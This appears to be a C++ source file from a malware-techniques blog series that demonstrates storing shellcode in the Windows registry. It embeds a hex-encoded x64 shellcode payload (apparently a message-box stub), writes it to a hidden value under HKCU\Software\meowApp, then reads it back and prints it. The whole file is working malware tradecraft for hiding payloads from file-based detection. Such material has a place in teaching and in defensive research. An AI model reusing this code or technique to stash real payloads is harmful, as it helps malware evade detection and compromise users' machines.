/*
 * hack.cpp - store binary data in registry. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2023/05/22/malware-tricks-29.html
*/
#include <windows.h>
#include <stdio.h>
#include <iostream>

void registryStore() {
  HKEY hkey;
  BYTE data[] = 
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";

  DWORD d;
  const char* secret = "Software\\meowApp";

  LSTATUS res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
  printf (res != ERROR_SUCCESS ? "failed to create reg key :(\n" : "successfully create key :)\n");

  res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, KEY_WRITE, &hkey);
  printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" : "successfully open registry key :)\n");

  res = RegSetValueEx(hkey, (LPCSTR)"secretMeow", 0, REG_BINARY, data, sizeof(data));
  printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" : "successfully set registry value :)\n");

  RegCloseKey(hkey);
}

void registryGetData() {
  HKEY hkey;
  DWORD size = 0;
  const char* secret = "Software\\meowApp";

  LSTATUS res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)secret, 0, KEY_READ, &hkey);
  printf(res != ERROR_SUCCESS ? "failed to open reg key :(\n" : "successfully open reg key:)\n");

  res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, nullptr, &size);
  printf(res != ERROR_SUCCESS ? "failed to query data size :(\n" : "successfully get binary data size:)\n");

  // allocate memory for the data
  BYTE *data = new BYTE[size];

  res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, data, &size);
  printf(res != ERROR_SUCCESS ? "failed to query data :(\n" : "successfully get binary data:)\n");

  printf("data:\n");
  for (int i = 0; i < size; i++) {
    printf("\\x%02x", static_cast<int>(data[i]));
  }
  printf("\n\n");

  RegCloseKey(hkey);
  delete[] data;
}

int main(void) {
  registryStore();
  registryGetData();
  return 0;
}